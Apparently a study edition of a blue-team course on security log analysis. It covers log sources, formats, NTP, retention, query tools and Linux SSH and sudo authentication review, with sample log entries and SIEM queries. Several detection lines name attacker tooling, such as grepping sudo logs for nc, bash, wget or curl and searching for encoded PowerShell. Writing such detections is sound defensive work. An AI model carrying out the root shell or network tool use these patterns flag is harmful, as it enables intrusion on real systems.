@@ -1,0 +1,2567 @@
+Foundations of Log Analysis for Cyber Defense.docx
+Plain text edition ? UTF-8
+
+Personal study notes. Text and tables are included; page layout and images are not reproduced. Practice cybersecurity only in systems you own or are explicitly authorized to test.
+========================================================================
+
+Foundations of Log Analysis for Cyber Defense
+Master enterprise log analysis, security telemetry correlation, SIEM investigations, and threat hunting methodologies used to detect, investigate, and respond to modern cyber threats across Windows, Linux, network, and cloud-connected environments.
+What this course is
+A comprehensive, hands-on cybersecurity training program focused on the collection, interpretation, correlation, and investigation of security telemetry generated throughout modern enterprise infrastructures. Beginning with the fundamentals of logging and telemetry management, the course progressively develops the skills required to analyze operating system events, network activity, authentication records, and security platform data before advancing into structured threat hunting, SIEM-driven investigations, and detection engineering techniques. The curriculum emphasizes the operational role of logs as primary evidence for identifying malicious activity, validating security events, and supporting incident response across complex environments.
+Each lesson combines practical laboratories, realistic defensive scenarios, guided investigations, and professional analytical workflows modeled after modern Security Operations Centers (SOC). Students work with authentic security data, investigate simulated attacks, correlate evidence across multiple log sources, develop detection logic using industry-standard query languages, and document investigative findings using methodologies that support repeatable, defensible, and operationally effective cyber defense practices.
+Objective
+After completing this course, you will be able to collect, analyze, correlate, and interpret security telemetry from multiple enterprise systems to investigate suspicious activity, identify indicators of compromise, perform structured threat hunting, develop practical detection logic, document investigative findings, and improve organizational visibility through SIEM technologies and industry-standard defensive methodologies used by modern security operations teams.
+Who this is for
+• SOC Analysts who want to strengthen their ability to investigate alerts, validate security events, and prioritize incidents using enterprise telemetry. • Blue Team professionals responsible for improving organizational visibility, monitoring infrastructure, and strengthening defensive operations. • Detection Engineers seeking practical experience building detections through log correlation, Sigma rules, KQL, SPL, and SIEM-based analytics. • DFIR professionals who need to reconstruct attacker activity through evidence collected from operating systems, network infrastructure, and security platforms. • Incident Responders responsible for triaging, investigating, documenting, and containing security incidents using reliable forensic evidence. • Threat Hunters looking to develop hypothesis-driven investigations across multiple telemetry sources to uncover malicious activity that automated detections may miss. • Security Engineers designing or maintaining logging pipelines, SIEM platforms, and enterprise monitoring architectures. • Students entering Cyber Defense who want a practical foundation in enterprise log analysis before specializing in incident response, threat hunting, or detection engineering.
+What you will learn
+Foundations of Security Logging — Understand how modern operating systems, applications, network devices, and security platforms generate telemetry, why logs represent one of the most valuable sources of forensic evidence, and how proper collection, normalization, timestamp synchronization, retention policies, and integrity directly affect investigation quality and incident response.
+Enterprise Log Structures and Data Interpretation — Learn to interpret common log formats, identify meaningful fields, distinguish between normal operational events and security-relevant activity, and understand how structured telemetry enables efficient searching, filtering, and correlation across diverse enterprise environments.
+Windows Security Event Analysis — Develop the ability to investigate Windows Event Logs, authentication events, privilege changes, process activity, and security-related system behavior while understanding how native Windows telemetry supports monitoring, detection, and forensic reconstruction.
+Linux Logging and Authentication Investigation — Analyze Linux system logs, Syslog records, authentication events, service activity, and administrative actions to identify unauthorized access, configuration changes, persistence attempts, and abnormal operating system behavior.
+Network Security Telemetry Analysis — Interpret firewall records, IDS and IPS alerts, DNS requests, proxy activity, authentication events, and access logs to understand how network telemetry reveals attacker movement, command-and-control activity, policy violations, and suspicious communications.
+Multi-Source Log Correlation — Learn how to connect evidence originating from operating systems, network infrastructure, EDR platforms, authentication systems, and application logs to reconstruct attack timelines and improve investigative confidence through contextual analysis.
+Threat Hunting Methodologies — Apply structured hunting techniques to develop investigative hypotheses, search for indicators of compromise, validate suspicious behaviors, and uncover attacker activity that may evade traditional alert-driven monitoring.
+Detecting Lateral Movement and Persistence — Explore how attackers establish persistence, move between systems, abuse authentication mechanisms, and maintain access, while learning how these behaviors can be identified through correlated security telemetry.
+Detection Engineering Fundamentals — Build practical detection logic using Sigma rules, Kusto Query Language (KQL), and Splunk Processing Language (SPL), transforming raw telemetry into repeatable detection strategies that improve defensive coverage.
+SIEM Investigation Workflows — Understand how Security Information and Event Management platforms aggregate, enrich, correlate, and visualize enterprise telemetry to accelerate investigations, improve visibility, and support large-scale monitoring operations.
+Security Analytics with the ELK Stack — Gain practical experience using Elasticsearch and Kibana to search, visualize, investigate, and analyze security events while developing efficient workflows for enterprise-scale telemetry analysis.
+Threat Intelligence Integration — Learn how external intelligence can enhance log analysis by providing contextual indicators, improving prioritization, validating suspicious activity, and strengthening investigative decision-making throughout the incident lifecycle.
+Investigation Methodology and Evidence Handling — Develop structured analytical processes for triaging alerts, validating evidence, documenting findings, maintaining investigative consistency, and communicating technical conclusions to security teams and stakeholders.
+Defensive Simulation and Practical Investigations — Reinforce technical concepts through realistic laboratories that simulate enterprise attack scenarios, allowing students to apply investigative methodologies, perform threat hunting exercises, validate detections, and strengthen operational decision-making under realistic conditions.
+Professional Security Reporting — Learn how to produce clear, technically accurate investigation reports that document observed activity, explain supporting evidence, describe defensive impact, and communicate actionable recommendations for remediation and future detection improvements.
+What you will be able to do by the end
+• Analyze Windows, Linux, and network security logs to identify suspicious activity and reconstruct security events with confidence. • Correlate telemetry from operating systems, authentication systems, DNS, proxy servers, firewalls, IDS/IPS platforms, and endpoint security solutions to build complete investigative timelines. • Investigate security alerts using structured analytical methodologies that reduce false positives and improve incident validation. • Detect attacker behaviors such as lateral movement, persistence, credential abuse, and anomalous authentication activity through evidence-driven analysis. • Build practical detections using Sigma rules, KQL, SPL, and correlation techniques suitable for enterprise security operations. • Perform SIEM investigations using the ELK Stack to search, visualize, filter, and interpret large volumes of security telemetry. • Develop repeatable threat hunting workflows that combine multiple data sources, investigative hypotheses, and threat intelligence to uncover hidden adversary activity. • Integrate defensive telemetry with contextual intelligence to improve prioritization, enrich investigations, and strengthen detection capabilities. • Document investigative findings through professional reports that clearly communicate technical evidence, conclusions, and recommended defensive actions. • Improve organizational security visibility by applying enterprise logging, telemetry correlation, detection engineering, and threat hunting practices aligned with modern Security Operations Center workflows.
+This content was generated by AI, validated by our instructors, and includes additional content. Please note that there are no video lessons; the courses are entirely text-based. Paid content is to support the platform subscription and other operational costs.
+Foundations of Log Analysis for Cyber Defense - Instructor
+Hi! I’m Joas Antonio dos Santos, your instructor for this course. I’ve spent years working in offensive security, Red Team operations, and malware development and now it’s your turn to start exploring this field.
+Let’s get started.
+Connect with me on LinkedIn
+Connect with me on X.com
+Red Team Leaders LinkedIn
+My Github
+Foundations of Log Analysis for Cyber Defense - References
+Books
+* "The Practice of Network Security Monitoring" – Richard Bejtlich
+Focuses on log-driven detection and network security monitoring using open-source tools.
+* "Blue Team Field Manual (BTFM)" – Alan J. White & Ben Clark
+A tactical guide with commands and references for analyzing logs, Windows event IDs, and network behaviors.
+* "Applied Network Security Monitoring" – Chris Sanders & Jason Smith
+In-depth methodologies and case studies on analyzing traffic and logs for threat detection.
+Official Documentation & Knowledge Bases
+* MITRE ATT&CK Framework – https://attack.mitre.org
+Mapping of tactics, techniques, and procedures (TTPs) used by adversaries, ideal for building detection use cases.
+* Elastic Security Documentation (ELK Stack) – https://www.elastic.co/guide/en/security
+Guides on parsing, enriching, and analyzing logs in a SIEM environment using Elasticsearch and Kibana.
+* Splunk Security Essentials – https://splunkbase.splunk.com/app/3435
+Includes pre-built detection content and log correlation examples across Windows, Linux, and cloud environments.
+* Sigma Rule Project – https://github.com/SigmaHQ/sigma
+An open standard for writing detection rules that can be mapped across multiple SIEMs.
+Online Labs and Datasets
+* Malware Traffic Analysis Labs – https://www.malware-traffic-analysis.net
+Offers PCAPs and logs from real attack scenarios, including C2, malware, and web attacks.
+* CyberDefenders Platform – https://cyberdefenders.org
+Realistic blue team challenges focused on log analysis, network traffic, and SIEM investigations.
+* DFIR Training (log analysis) – https://www.dfir.training
+Central hub for digital forensics and incident response training, including logs and timeline analysis.
+Tools for Practical Log Analysis
+* LogParser Studio (Windows logs) – https://github.com/airbus-cyber/LogParser
+Tool for querying and analyzing Windows Event Logs.
+* Arkime (formerly Moloch) – https://arkime.com
+Network traffic capture and log analysis platform for deep investigation and hunting.
+* Graylog – https://www.graylog.org
+SIEM-like log aggregator with parsing, alerting, and dashboard capabilities.
+* Timesketch (Timeline Analysis) – https://github.com/google/timesketch
+Open-source tool for digital forensic timeline analysis using log data.
+Foundations of Log Analysis for Cyber Defense - 1.1 What Are Logs and Why They Matter
+Introduction
+In cybersecurity operations, especially from a Blue Team perspective, logs are fundamental to visibility, monitoring, and response. They represent the footprints of everything that happens in a system, application, or network. Without logging, detecting abnormal behavior or tracking malicious activity becomes nearly impossible.
+A log is a timestamped record generated by a system, application, service, device, or security tool. Logs document events such as user authentications, process executions, network connections, file accesses, configuration changes, system errors, or security policy violations.
+Types of Logs (by Source)
+Source | Log Example | Use Case for Blue Team
+Operating System (Linux) | /var/log/auth.log | SSH login attempts, sudo usage
+Operating System (Windows) | Security.evtx | Logons, process creations, privilege usage
+Network Devices | Firewall logs, DHCP logs | Blocked traffic, address leasing
+Web Servers | Apache, Nginx access/error logs | Suspicious URIs, 404 fuzzing, directory traversal
+Security Tools | EDR, antivirus, SIEM logs | Threat detections, lateral movement
+Cloud Infrastructure | AWS CloudTrail, Azure Activity Log | API misuse, privilege escalation attempts
+Event vs Log
+* Event: A single instance or action (e.g., “User X logged in”).
+* Log: The written record of an event, possibly structured (JSON) or unstructured (plaintext).
+Every log contains at least a timestamp, the source/system, and the description of the event. Additional fields depend on the software/hardware generating the log.
+Real Examples of Log Entries
+1. Linux SSH Authentication Failure
+Jun 20 18:45:32 ubuntu sshd[2541]: Failed password for root from 192.168.1.23 port 49522 ssh2
+* Interpretation: The system rejected an SSH password attempt for the root user from IP 192.168.1.23.
+* Use Case: Correlate multiple failed attempts to detect brute-force activity.
+2. Windows Logon Event (Security.evtx, Event ID 4624)
+Log Name: SecurityEvent ID: 4624Logon Type: 10Account Name: AdministratorSource Network Address: 10.0.0.14
+* Interpretation: A successful Remote Desktop Protocol (RDP) login from 10.0.0.14 to the Administrator account.
+* Use Case: Detection of unauthorized RDP access or lateral movement.
+3. Web Server Access Log (Apache)
+192.168.1.50 - - [29/Jun/2025:14:23:42 +0000] "GET /admin HTTP/1.1" 401 487
+* Interpretation: Client 192.168.1.50 attempted to access a restricted area (/admin) and received a 401 Unauthorized.
+* Use Case: Detecting probing or web-based brute-force against login/admin portals.
+4. IDS Alert (Suricata JSON format)
+{  "timestamp": "2025-06-29T16:21:00.512293Z",  "event_type": "alert",  "src_ip": "192.168.1.10",  "dest_ip": "10.10.1.23",  "alert": {    "signature": "ET SCAN Nmap -sS Syn Scan",    "severity": 2  }}
+* Interpretation: Intrusion detection system identified a SYN scan likely from Nmap.
+* Use Case: Alert triage, source attribution, trigger correlation in SIEM.
+Why Logs Are Critical for Blue Teams
+* Visibility: Logs provide insight into user activity, system changes, and potential threats.
+* Forensics: In post-incident investigation, logs are often the only timeline available.
+* Detection Engineering: All detection rules (e.g., in SIEM or EDR) rely on log-based patterns.
+* Compliance and Auditing: Regulatory frameworks like PCI-DSS, HIPAA, and ISO 27001 require evidence of logging.
+* Threat Hunting: Hypothesis-based searches through logs can reveal stealthy attackers.
+Common Blue Team Use Cases Involving Logs
+Use Case | Related Log Type(s)
+Detect brute-force attacks | SSH logs, Event ID 4625 (Windows)
+Investigate privilege abuse | Event ID 4672 (Windows), sudo logs (Linux)
+Detect suspicious command execution | Event ID 4688, Sysmon, bash_history
+Trace lateral movement | RDP logs, SMB connections, port scans
+Identify web attack vectors | Apache/Nginx access logs, WAF logs
+Monitor file access or exfil | File integrity logs, EDR telemetry
+Logging Pitfalls to Avoid
+* No central logging: Local logs are easily erased by attackers.
+* No time sync (NTP): Event correlation becomes unreliable.
+* Unstructured logging: Makes automation and parsing harder.
+* Insufficient retention: Historical analysis becomes impossible.
+* Too much noise: Without filtering, important signals get buried.
+Logs are the foundation of security operations. Whether responding to incidents, building detections, or hunting for threats, Blue Teams depend on accurate, complete, and well-structured log data. Understanding the types of logs, their format, and their role in daily security tasks is the first step toward mastering log analysis.
+Foundations of Log Analysis for Cyber Defense - 1.2 Common Log Formats and Structures
+Introduction
+Effective log analysis requires not only understanding what logs are, but also how they are structured. Logs come in many formats depending on their origin, such as operating systems, network devices, security tools, and web servers. A Blue Team analyst must be able to quickly identify the format of a log, parse its key fields, and extract relevant information for triage, detection, and investigation.
+Logs may be structured, semi-structured, or unstructured. The format used affects how easily logs can be ingested by SIEM platforms, parsed with tools, or correlated across systems.
+Log Format Categories
+* Plain Text Logs
+Common in Linux systems and legacy applications. These are human-readable and line-oriented but often require regular expressions or tools like grep for parsing.
+* Key-Value Pair Logs
+Each line contains space-separated key=value pairs. This structure allows basic parsing and filtering.
+* CSV Logs
+Comma-separated values, useful for exporting and analyzing in Excel or ingestion by SIEMs.
+* JSON Logs
+Structured logs used by modern applications and tools like Suricata, AWS CloudTrail, or Elastic Beats. Easily parsed by machines and log pipelines.
+* XML Logs
+Less common today but still used in legacy systems and some enterprise software.
+* Binary Logs
+Examples include Windows Event Logs (EVTX), which require special tools like Event Viewer or LogParser to read.
+Practical Examples by Format
+1. Plain Text – Linux Auth Log
+Jun 30 10:12:43 server sshd[1290]: Accepted password for admin from 192.168.0.12 port 50222 ssh2
+Key elements: timestamp, hostname, process (sshd), status message
+Use case: Authentication success, origin IP, user identity
+2. Key-Value Format – Systemd Journal Log
+MESSAGE=Failed password for invalid user test from 10.1.1.5 port 50022 ssh2PRIORITY=3SYSLOG_IDENTIFIER=sshd
+Use case: Useful in Red Hat-based systems using journalctl. Easier to extract specific fields.
+3. CSV Format – Firewall Log Export
+timestamp,src_ip,dest_ip,port,action2025-06-30 12:01:55,10.0.0.5,192.168.10.1,443,allow
+Use case: Easy import into SIEM or spreadsheets for analysis of firewall behavior.
+4. JSON Format – Suricata Alert
+{  "timestamp": "2025-06-30T12:04:11.482Z",  "event_type": "alert",  "src_ip": "10.10.10.10",  "dest_ip": "192.168.100.5",  "alert": {    "signature": "ET SCAN Nmap Scripting Engine",    "severity": 2  }}
+Use case: Structured format makes this ideal for parsing in SIEMs or log pipelines like ELK. Allows querying fields such as alert.signature or src_ip.
+5. XML Format – Web Application Firewall Log
+<event>  <date>2025-06-30</date>  <src_ip>172.16.0.8</src_ip>  <event_type>SQL Injection Attempt</event_type></event>
+Use case: Some older or enterprise tools output XML. Requires XPath or similar methods for extraction.
+6. EVTX (Binary) – Windows Event Log
+Can be viewed using:
+* Event Viewer GUI
+* Get-WinEvent or wevtutil via PowerShell
+* LogParser or SIEM agent ingestion
+Example (Security.evtx, Event ID 4688):
+A new process has been created.New Process Name: C:\Windows\System32\cmd.exeCreator Process: C:\Windows\explorer.exe
+Use case: Detecting suspicious process execution like cmd.exe, powershell.exe, or rundll32.exe.
+Field Standardization and Normalization
+Since each log source has its own schema, one of the biggest challenges in centralized log analysis is normalization. This is the process of converting different log formats and fields into a common schema.
+For example:
+Raw Field (Vendor-specific) | Normalized Field
+src_ip, source-address, ip.src | source_ip
+username, user, acct | user_name
+timestamp, @timestamp, time | event_time
+This standardization is critical in SIEM platforms like Splunk, Elastic Security, or QRadar to build detection rules that work across multiple data sources.
+Practical Considerations for Blue Teams
+* Use parsing and enrichment tools like Logstash, Fluent Bit, or syslog-ng to convert and enrich log data.
+* Build dashboards based on normalized fields for cross-platform visibility.
+* Validate that log sources produce structured outputs whenever possible to ease correlation and search.
+* Understand how your SIEM ingests and parses each log type.
+Understanding log formats is a core skill for any Blue Team professional. Each source system, whether it's an operating system, firewall, or application, produces logs in its own format, and these formats directly affect how logs can be ingested, parsed, and analyzed.
+Being able to recognize and work with different formats such as plaintext, JSON, CSV, and binary (like Windows EVTX) is essential for building effective detection rules, hunting threats, and conducting forensic investigations. Additionally, the process of normalizing logs across different systems ensures that security operations teams can correlate events accurately and build scalable detection logic.
+Foundations of Log Analysis for Cyber Defense - 1.3 Timestamps, Timezones, and Synchronization (NTP)
+Introduction
+Accurate timestamps are one of the most critical components of effective log analysis. Time-based correlation is the backbone of detecting, investigating, and reconstructing security incidents. When timestamps are misaligned across different systems, analysts may misinterpret the sequence of events or completely overlook key indicators.
+Ensuring that all systems use consistent and synchronized time is a fundamental practice in cybersecurity operations. This is accomplished using Network Time Protocol (NTP), which allows devices to regularly update their internal clocks from a trusted time source.
+Understanding Timestamps
+Most logs contain timestamps that indicate when an event occurred. However, the format, timezone, and precision of these timestamps can vary significantly depending on the source.
+Common timestamp formats:
+* Human-readable local time
+Jun 30 14:22:432025-06-30 18:45:12
+* UTC time with timezone offset
+2025-06-30T18:45:12+00:002025-06-30T18:45:12Z
+* Epoch/Unix time (integer value of seconds since 1970-01-01)
+Timestamp: 1751372712 → Human time: 2025-06-30 18:45:12 UTC
+* High-precision timestamp with milliseconds or microseconds
+2025-06-30T18:45:12.783Z2025-06-30 14:22:43.154 +0200
+Each of these formats may be used in different environments or tools, such as syslog, web server logs, cloud logs, or SIEM platforms.
+Timezone Discrepancies in Log Analysis
+Timezone misalignment is a common problem during incident investigation. For example, if a firewall logs in UTC, a Linux server logs in local time (UTC-3), and an application server logs in UTC+1, then the same event might appear to occur at three different times.
+This leads to:
+* Misinterpretation of event order
+* Gaps in correlation logic
+* Incorrect incident timelines
+* False positives in detection rules
+Example Scenario
+Three logs from different systems, showing the same event:
+Linux server (UTC-3):
+Jun 30 15:12:02 sshd[2991]: Accepted password for joao from 10.0.0.10
+Firewall (UTC):
+2025-06-30T18:12:02Z src=10.0.0.10 dst=192.168.1.20 action=accept
+Application log (UTC+1):
+2025-06-30 19:12:02 user=joao login_success=true
+Although all these events refer to the same authentication session, the timestamps differ by hours. Without a standardized time reference, incident correlation becomes unreliable.
+Network Time Protocol (NTP)
+NTP is a protocol that synchronizes system clocks with designated time servers. When implemented correctly, it ensures that all systems within an infrastructure maintain consistent time — typically synchronized to Coordinated Universal Time (UTC).
+Linux Configuration
+To enable and verify NTP synchronization:
+sudo timedatectl set-ntp truetimedatectl status
+Output Example:
+Local time: Mon 2025-06-30 15:00:00 -03Universal time: Mon 2025-06-30 18:00:00 UTCNTP synchronized: yes
+Windows Configuration
+NTP settings are controlled via Control Panel or PowerShell:
+w32tm /query /statusw32tm /resync
+Best Practices:
+* Use a central internal NTP server or a pool of public NTP servers.
+* Avoid relying on system BIOS or hardware clocks.
+* Monitor and alert on systems that deviate from expected time accuracy.
+* Normalize timestamps to UTC in SIEM platforms to ensure consistent correlation.
+Timestamp Normalization in Log Pipelines
+Many organizations normalize timestamps at the log ingestion stage. For example, Logstash or Fluent Bit can parse and convert various timestamp formats into a standardized field like @timestamp in UTC.
+Logstash Example:
+filter {  date {    match => [ "log_time", "yyyy-MM-dd HH:mm:ss" ]    target => "@timestamp"    timezone => "UTC"  }}
+SIEMs like Splunk or Elastic Search rely heavily on timestamp parsing for alerting, correlation, and timeline views. Incorrectly parsed or missing timestamps often cause events to be indexed out of order or excluded from detection logic.
+Foundations of Log Analysis for Cyber Defense - 1.4 Log Rotation and Retention Policies
+Introduction
+As systems and applications run continuously, logs can grow rapidly and consume significant disk space if not properly managed. Uncontrolled log growth may lead to system instability, data loss, or inability to retain important forensic evidence. Blue Team professionals must understand and implement log rotation and retention strategies to ensure performance, availability, and security compliance.
+Log rotation refers to the process of archiving, compressing, or deleting old log files after a specific time interval or when a size threshold is reached. Retention policies define how long logs should be stored and which logs are critical to preserve for auditing, detection, or investigation.
+Why Log Management Is Critical
+* Disk space control: Prevents logs from filling up the disk and crashing services.
+* Forensic preservation: Ensures key evidence is available during an incident investigation.
+* Compliance: Many frameworks (e.g., PCI-DSS, HIPAA, ISO 27001) require logs to be retained for months or years.
+* Performance: Overly large log files can slow down parsing tools and SIEM ingestion.
+* Alerting: Missed log rotation may indicate misconfiguration or malicious log tampering.
+Log Rotation in Practice
+Linux Systems
+Most Linux distributions use logrotate, a utility that manages the rotation, compression, and deletion of log files. It is configured via /etc/logrotate.conf and individual files in /etc/logrotate.d/.
+Example:
+/var/log/auth.log {    weekly    rotate 4    compress    missingok    notifempty}
+This configuration means:
+* Logs are rotated weekly.
+* Only 4 archives are kept.
+* Old logs are compressed (e.g., .gz).
+* Rotation is skipped if the file is empty.
+* If the file is missing, no error is raised.
+Manual Test:
+sudo logrotate --debug /etc/logrotate.conf
+Windows Systems
+Windows Event Logs rotate automatically based on file size or overwrite policy. These settings can be changed via the Event Viewer.
+Steps:
+* Open Event Viewer → Right-click a log (e.g., Security) → Properties
+* Set maximum log size (e.g., 200 MB)
+* Choose action: Overwrite events, archive logs, or stop logging
+PowerShell Check:
+Get-EventLog -LogName Security | Measure-Object
+Retention Policy Design
+Log retention depends on multiple factors:
+* Regulatory requirements
+* Internal security policy
+* Storage capacity
+* Business risk and criticality of system
+Typical Retention Guidelines:
+Log Type | Recommended Retention
+Authentication logs (SSH, RDP) | 180–365 days
+Security logs (EDR, SIEM) | 1–3 years
+Web server access logs | 90–180 days
+Firewall, IDS/IPS logs | 90–365 days
+Cloud API activity logs | 180–365 days
+Compliance-regulated systems | 1–7 years
+Retention Tools and Strategies:
+* Centralize logs in SIEM or cloud storage (e.g., S3, Azure Blob)
+* Implement cold storage tiers for infrequently accessed logs
+* Encrypt archived logs to maintain confidentiality and integrity
+* Tag logs with metadata to automate lifecycle management
+Security Considerations
+* Prevent unauthorized access to archived logs
+* Monitor for log deletion or tampering attempts
+* Ensure log forwarding continues after rotation
+* Validate that logs are not truncated during compression or archiving
+Log Forwarding Example (Linux rsyslog):
+*.* @192.168.1.10:514
+This sends all log events to a centralized syslog server.
+Foundations of Log Analysis for Cyber Defense - 1.5 Log Access and Visualization Tools
+Introduction
+Collecting logs is only the first step. Security analysts must also be able to access, search, and visualize log data quickly and effectively to respond to incidents or perform investigations. Choosing the right tools for log access depends on factors like log format, source, volume, and team workflow.
+This section focuses on tools and techniques used by Blue Team professionals to interact with logs efficiently in both local and centralized environments.
+Local Access Tools
+In environments without centralized logging, logs are accessed directly from the system where they are generated. This is common in endpoint investigations, incident response scenarios, or when a SIEM is unavailable.
+Command-Line Tools (Linux and macOS)
+* cat – View the contents of log files
+* less – Paginate logs interactively
+* tail -f – Follow logs in real time
+* grep – Search for patterns in logs
+* awk, sed – Filter and format output
+* journalctl – Query systemd journal logs
+* jq – Parse JSON logs
+Examples
+View the last 20 SSH login failures:
+grep "Failed password" /var/log/auth.log | tail -n 20
+Follow system log updates in real time:
+tail -f /var/log/syslog
+Parse and pretty-print Suricata JSON logs:
+cat eve.json | jq '.'
+Query specific time window with journalctl:
+journalctl --since "2025-06-30 14:00:00" --until "2025-06-30 14:10:00"
+Windows Access Tools
+* Event Viewer – Graphical interface to browse logs
+* PowerShell Cmdlets
+* Get-EventLog (legacy)
+* Get-WinEvent (modern, supports XML queries)
+* LogParser – Query EVTX logs using SQL-like syntax
+* Sysinternals Tools – For live log monitoring (PsLogList, Procmon)
+Examples
+Get last 10 security events:
+Get-WinEvent -LogName Security -MaxEvents 10
+Filter by Event ID:
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}
+Text Editors and GUI Tools
+For reviewing logs manually, especially plaintext or CSV logs, text editors are useful:
+* Notepad++ – Supports regex search, syntax highlighting, large files
+* Visual Studio Code – Extensible with log viewing plugins
+* BareTail – Real-time log tailing on Windows
+* Glogg – Multi-platform log explorer for large files
+* Sublime Text – Lightweight with multiline search support
+Use case: Quickly inspecting logs from EDR exports, firewall logs, or JSON from cloud exports.
+Centralized Log Management and SIEM Platforms
+When logs are collected across multiple systems, centralized platforms provide scalable search and analysis capabilities.
+Popular Tools:
+* Splunk
+* Search logs using SPL (Search Processing Language)
+* Dashboards, alerts, and playbooks
+* Used in SOCs for triage and response
+* Elastic Stack (ELK)
+* Elasticsearch, Logstash, Kibana
+* Scalable search and visualization
+* Common in open-source SIEM implementations
+* Graylog
+* Centralized logging with stream-based alerts
+* Supports GELF and structured logging
+* Custom pipelines for log parsing
+* SIEM-as-a-Service Tools
+* Microsoft Sentinel, Chronicle, QRadar Cloud
+* Scalable ingestion, correlation rules, and ML-based alerts
+Example: Basic Splunk Search
+Find failed logons from all Windows hosts:
+index=windows EventCode=4625 | stats count by Account_Name, host
+Search for PowerShell usage with encoded commands:
+index=windows "powershell" "EncodedCommand"
+Example: ELK Query via Kibana
+Filter all alerts from Suricata with severity 1:
+{  "query": {    "bool": {      "must": [        { "match": { "alert.severity": "1" } },        { "match": { "event_type": "alert" } }      ]    }  }}
+Use Cases for Visualization
+* Build dashboards to track login activity, geolocation of IPs, and command execution
+* Visualize spikes in failed login attempts to detect brute-force attacks
+* Create alert thresholds and timelines of incident activity
+* Use correlation maps to connect events across hosts or networks
+Best Practices for Blue Team Log Access
+* Build and maintain saved queries for common threat scenarios
+* Use field extraction and parsing early in the pipeline
+* Implement role-based access to sensitive logs
+* Regularly audit log visibility to ensure coverage across systems
+* Tailor visualizations to highlight anomalies, not just raw volume
+Foundations of Log Analysis for Cyber Defense - 2.1 Linux Log Sources and Authentication Analysis
+Introduction
+Linux systems produce a wide variety of logs that are essential for tracking user activity, authentication attempts, privilege escalation, and system behavior. Blue Team professionals need to understand where these logs are stored, how they are structured, and how to interpret them to detect suspicious behavior such as brute-force attacks, unauthorized access, or privilege misuse.
+Key Log Files on Linux Systems
+Log File | Description
+/var/log/auth.log | Authentication, sudo, SSH login attempts
+/var/log/secure | Equivalent to auth.log in RHEL-based distros
+/var/log/syslog | General system events, kernel messages
+/var/log/messages | Daemon and system messages (RHEL/CentOS)
+/var/log/wtmp | Binary log of user logins and reboots
+/var/log/btmp | Failed login attempts (binary)
+/var/log/lastlog | Last login of all users
+/var/log/sudo.log | Optional sudo log file (depends on configuration)
+Note: Depending on the Linux distribution, the location and structure of logs may vary. Debian/Ubuntu use auth.log, while RHEL/CentOS typically use secure.
+Authentication Logs: SSH and Sudo Activity
+Authentication events are among the most critical logs for Blue Team monitoring. They help detect brute-force attacks, credential misuse, and lateral movement.
+Example: SSH Failed Login
+Jun 30 14:45:21 server sshd[1183]: Failed password for root from 192.168.0.10 port 54022 ssh2
+Fields:
+* Timestamp: Jun 30 14:45:21
+* Process: sshd[1183]
+* Message: Failed password
+* User: root
+* Source IP: 192.168.0.10
+* Port: 54022
+* Protocol: ssh2
+Use case: Detection of brute-force or dictionary attacks from a specific source IP.
+Example: SSH Successful Login
+Jun 30 14:45:24 server sshd[1183]: Accepted password for root from 192.168.0.10 port 54022 ssh2
+A sequence of failed followed by successful logins from the same IP may indicate credential guessing or stolen credentials.
+Sudo Usage Detection
+Sudo allows users to execute commands as another user (typically root). Monitoring sudo usage is key to detecting privilege escalation or misuse.
+Example: Sudo Log Entry (in auth.log):
+Jun 30 14:47:11 server sudo:     joao : TTY=pts/0 ; PWD=/home/joao ; USER=root ; COMMAND=/bin/bash
+Interpretation:
+* User joao executed /bin/bash as root
+* Executed from terminal pts/0, current directory /home/joao
+Use case: Identify privilege escalation, lateral movement, or shell access as root.
+Alternative configuration:
+Some systems log sudo activity in a dedicated /var/log/sudo.log if enabled:
+Defaults logfile="/var/log/sudo.log"
+Useful Linux Commands for Authentication Analysis
+* Query SSH logins
+grep "Accepted password" /var/log/auth.log
+* Find failed login attempts
+grep "Failed password" /var/log/auth.log
+* Summarize by IP
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
+* Review sudo usage
+grep "sudo" /var/log/auth.log
+* Show recent logins (from binary wtmp)
+last
+* Show failed logins (from binary btmp)
+lastb
+Anomaly Detection Use Cases
+Pattern | Indicator
+Multiple failed logins | Brute-force attempt
+Login at unusual time | Insider threat or compromised account
+Use of sudo by unauthorized user | Privilege escalation
+SSH access from unusual country/IP | Possible lateral movement
+Frequent switching between users | Session hijack or enumeration
+Integration with SIEM
+When logs are forwarded to a SIEM, you can define detection rules based on parsed fields such as:
+* event.source: sshd
+* event.outcome: success or failure
+* user.name: root, joao, etc.
+* source.ip: IP address of the connection
+Sample SIEM Query (ELK/ElasticSearch):
+{  "query": {    "bool": {      "must": [        { "match": { "event.module": "ssh" } },        { "match": { "event.outcome": "failure" } },        { "range": { "@timestamp": { "gte": "now-1h" } } }      ]    }  }}
+This query detects failed SSH login attempts within the last hour.
+SSH Key-Based Login (authorized_keys)
+Jun 30 15:12:33 server sshd[1542]: Accepted publickey for analyst from 10.0.1.5 port 49201 ssh2: RSA SHA256:abc123...
+Use case: Identify which users are using key-based authentication. Can be used for persistence by attackers if keys are added to ~/.ssh/authorized_keys.
+Session Closure
+Jun 30 15:45:10 server sshd[1542]: Received disconnect from 10.0.1.5 port 49201:11: disconnected by user
+Use case: Detect session duration and correlate session start/end times to identify long-lasting sessions.
+Invalid User Enumeration
+Jun 30 16:03:22 server sshd[1683]: Invalid user testadmin from 203.0.113.5 port 53444
+Use case: Enumeration of non-existent users is a precursor to brute-force attacks or reconnaissance.
+Event Correlation Techniques
+A strong detection capability involves correlating multiple related events. Some useful correlation techniques include:
+* Brute-force Detection
+* Pattern: High number of Failed password entries within a short time span
+* Correlation: Single IP → Multiple usernames or multiple attempts to a single username
+* Response: Block IP or initiate account lockout rule
+* Credential Stuffing
+* Pattern: Same password attempted across many usernames
+* Source: Often from automated tools using leaked credentials
+* Successful Login After Multiple Failures
+* Pattern: Failed password × N → Accepted password
+* Example:
+Jun 30 20:11:03 sshd[2311]: Failed password for root from 203.0.113.9  Jun 30 20:11:06 sshd[2312]: Failed password for root from 203.0.113.9  Jun 30 20:11:09 sshd[2313]: Accepted password for root from 203.0.113.9
+* Use case: Flag as compromised if login succeeded after multiple failures
+* Unusual User Activity
+* Pattern: Non-privileged user invoking sudo for binaries like netcat, bash, or wget
+* Detection via:
+grep "sudo" /var/log/auth.log | grep -E 'nc|bash|wget|curl'
+Threat Hunting Techniques on Linux Logs
+Technique 1: Hunting Interactive Root Access
+Look for direct shell sessions as root (especially unexpected ones):
+grep 'COMMAND=/bin/bash' /var/log/auth.log | grep 'USER=root'
